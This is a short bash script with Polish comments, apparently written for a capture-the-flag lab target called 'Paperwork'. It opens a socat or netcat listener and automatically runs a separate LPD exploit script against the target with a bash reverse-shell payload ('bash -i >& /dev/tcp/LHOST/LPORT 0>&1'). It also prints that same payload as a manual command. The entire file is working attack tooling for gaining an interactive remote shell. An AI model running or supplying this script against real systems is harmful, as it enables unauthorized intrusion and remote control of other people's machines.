#!/usr/bin/env bash
# Paperwork — interaktywny reverse shell w tym terminalu (PTY).
# Użycie: uruchom ten skrypt w NOWYM oknie terminala (lub: ./open-interactive-shell.sh)

set -euo pipefail
TARGET="${TARGET:-10.129.41.146}"
LHOST="${LHOST:-10.10.17.138}"
LPORT="${LPORT:-4444}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "=============================================="
echo " Paperwork — listener PTY na ${LHOST}:${LPORT}"
echo " Target: ${TARGET}"
echo "=============================================="
echo ""
echo "[1] Za chwilę wystartuje socat (lepszy TTY niż zwykłe nc)."
echo "[2] Potem automatycznie poleci LPD exploit (możesz powtórzyć ręcznie)."
echo ""
echo "Ręczny exploit:"
echo "  python3 ${SCRIPT_DIR}/lpd_exploit.py ${TARGET} -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
echo ""
read -r -p "Enter = start listener + exploit ..." _

# Listener z pseudo-TTY (Kali)
if command -v socat >/dev/null 2>&1; then
  (
    sleep 2
    python3 "${SCRIPT_DIR}/lpd_exploit.py" "${TARGET}" \
      -c "bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'" 2>/dev/null || true
  ) &
  echo "[*] socat TCP-L:${LPORT} — czekam na shell (wpisuj komendy poniżej)..."
  exec socat file:$(tty),raw,echo=0 TCP-L:${LPORT}
else
  (
    sleep 2
    python3 "${SCRIPT_DIR}/lpd_exploit.py" "${TARGET}" \
      -c "bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'" 2>/dev/null || true
  ) &
  echo "[*] nc -lvnp ${LPORT} (zainstaluj socat dla lepszego TTY: sudo apt install socat)"
  exec rlwrap -cAr nc -lvnp "${LPORT}"
fi